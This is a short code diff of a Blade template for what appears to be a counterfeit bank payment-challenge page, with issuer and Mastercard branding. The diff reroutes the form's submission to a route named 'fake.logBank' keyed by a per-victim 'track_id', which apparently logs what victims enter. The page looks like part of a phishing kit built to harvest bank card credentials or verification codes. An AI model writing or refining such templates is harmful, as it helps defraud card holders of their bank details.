@@ -7,7 +7,7 @@
     <div id="branding-zone"><img id="issuer-image" src="{{asset('images/banks/method-223-464c07636f.svg')}}"><img
                 id="payment-system-image" src="{{asset('images/banks/mastercard-logo.png')}}">
     </div>
-    <form id="bank_pm_form" class="challenge-form" method="POST" action="/log/bank"
+    <form id="bank_pm_form" class="challenge-form" method="POST" action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}"
           role="form">
 
 
